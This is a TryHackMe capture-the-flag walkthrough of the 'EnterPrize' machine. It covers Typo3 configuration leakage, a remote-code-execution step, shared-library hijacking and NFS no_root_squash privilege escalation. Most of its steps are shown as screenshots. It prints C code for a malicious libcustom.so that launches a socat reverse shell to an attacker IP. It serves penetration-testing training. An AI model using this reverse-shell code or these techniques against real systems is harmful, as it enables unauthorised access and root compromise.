# EnterPrize TryHackMe Writeup
### Level: `Hard` | OS: `Linux`

![logo](1.jpeg)

## Scanning
We launch **nmap** to all ports, with script and software version.

![](2.png)

## Enumeration
We access the web resource, but there is nothing.

![](3.png)

We launch the **nikto** tool and find the file *"composer.json"*, these files usually reveal interesting information.

![](4.png)

#### Contents of the file "composer.json"

![](5.png)

It seems that there are leftover files from **CMS Typo3**, I check several paths but I can't find anything.... But maybe it is in another *subdomain* by virtual hosting (vhost).

We launch the **wfuzz** tool in vhost mode:

![](6.png)

We add the subdomain to our */etc/hosts file*, access the new site and find the **Typo3 CMS** that we listed information in the previous file.

![](7.png)

For this CMS I used the **[Typo3Scan](https://github.com/whoot/Typo3Scan)** tool to find vulnerabilities in this cms.

![](8.png)

List the control panel:

![](9.png)

We enter credentials by guessing, it seems to work, but the site has gone into maintenance mode and we no longer have access to the panel.

![](10.png)

We launch **dirsearch**, list several interesting files and folders.

![](11.png)

Access the *"/typo3conf"* directory and list the *"LocalConfiguration.old"* file.

![](13.png)

#### Part of the content of the "LocalConfiguration.old" file

![](14.png)

![](15.png)

## Exploitation

In view of the above, I search for information about exploits and find this interesting **[article](https://www.synacktiv.com/en/publications/typo3-leak-to-remote-code-execution.html)**.

We list the sections of the site, we find a form from which we could carry out the exploitation.

![](17.png)

We follow the instructions in the article and create a payload to generate the file *"m3.php"* and execute commands through it.

![](18.png)

#### Sending malicious request:

![](19.png)

#### Proof of concept

![](20.png)

#### Reverse shell

![](21.png)

We make an enumeration in the only user that has home, we find some files and a binary that seems interesting.

![](26.png)


We check the libraries, we see that it calls *"libcustom.so"*, we see that we also have write permissions, so it would make a lot of sense to replace the file with another illegitimate one.

![](27.png)

#### Contents of file libcustom.c

```C
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void do_ping(){
    system("/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.6.62.222:5555", NULL, NULL);
}
```

We see that the configuration file has a symbolic link to a *"test.conf"* file in the folder, this file is not found but we can write it.

![](29.png)

We run the **pspy64** tool and we see that every few minutes it executes the binary and with it our reverse shell.

![](28.png)

We wait a few minutes, get shell as the user *"john"* and read the user flag.

![](30.png)

## Privilege Escalation
In the previous enumeration, we saw that there is an nfs working internally, but we did not have access with the user *"www-data"*. 
In the evidence we see that it is vulnerable to **"no_root_squash"**, this vulnerability would allow us to be able to run a shared binary on our machine and get the same privileges of its SUID.

![](23.png)

Hacemos port forwarding con **chisel** al servicio **NFS**.

![](31.png)

We authenticate as root, create a malicious binary, compile and give it permissions.

![](34.png)

Run the binary from the victim's nfs directory and you will become root.

![](35.png)

---
## About

David Utón is Penetration Tester and security auditor for web and mobiles applications, perimeter networks, internal and industrial corporate infrastructures, and wireless networks.

#### Contacted on:

<img src='https://m3n0sd0n4ld.github.io/imgs/linkedin.png' width='40' align='center'> [David-Uton](https://www.linkedin.com/in/david-uton/)
<img src='https://m3n0sd0n4ld.github.io/imgs/twitter.png' width='43' align='center'> [@David_Uton](https://twitter.com/David_Uton)
